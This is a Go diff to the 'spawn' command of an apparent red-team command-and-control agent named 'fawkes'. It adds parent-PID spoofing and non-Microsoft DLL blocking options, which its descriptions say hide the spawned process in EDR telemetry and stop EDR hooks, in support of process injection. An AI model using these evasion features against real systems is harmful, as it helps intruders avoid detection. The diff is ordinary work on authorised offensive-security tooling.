@@ -12,10 +12,10 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "spawn",
-		Description:         "Spawn a suspended process or thread for use with injection techniques like apc-injection.",
+		Description:         "Spawn a suspended process or thread for use with injection techniques like apc-injection. Supports PPID spoofing and non-Microsoft DLL blocking.",
 		HelpString:          "spawn",
-		Version:             1,
-		MitreAttackMappings: []string{"T1055"}, // Process Injection
+		Version:             2,
+		MitreAttackMappings: []string{"T1055", "T1134.004"}, // Process Injection, Parent PID Spoofing
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		CommandAttributes: agentstructs.CommandAttribute{
@@ -33,6 +33,34 @@ func init() {
 						ParameterIsRequired: true,
 						GroupName:           "Process",
 						UIModalPosition:     0,
+					},
+				},
+			},
+			{
+				Name:             "ppid",
+				ModalDisplayName: "Parent PID",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				Description:      "Spoof parent process ID (0 = don't spoof). The spawned process will appear as a child of this PID in Task Manager and EDR telemetry.",
+				DefaultValue:     0,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Process",
+						UIModalPosition:     1,
+					},
+				},
+			},
+			{
+				Name:             "blockdlls",
+				ModalDisplayName: "Block Non-MS DLLs",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Block non-Microsoft-signed DLLs from loading in the spawned process. Prevents most EDR hooking DLLs from injecting.",
+				DefaultValue:     false,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Process",
+						UIModalPosition:     2,
 					},
 				},
 			},
@@ -86,6 +114,18 @@ func init() {
 				}
 				params["path"] = path
 				displayParams = fmt.Sprintf("Executable: %s (suspended)", path)
+
+				// Optional PPID spoofing
+				if ppid, err := taskData.Args.GetNumberArg("ppid"); err == nil && ppid > 0 {
+					params["ppid"] = int(ppid)
+					displayParams += fmt.Sprintf(", PPID spoof: %d", int(ppid))
+				}
+
+				// Optional DLL blocking
+				if blockdlls, err := taskData.Args.GetBooleanArg("blockdlls"); err == nil && blockdlls {
+					params["blockdlls"] = true
+					displayParams += ", blockdlls: on"
+				}
 
 			case "thread":
 				params["mode"] = "thread"
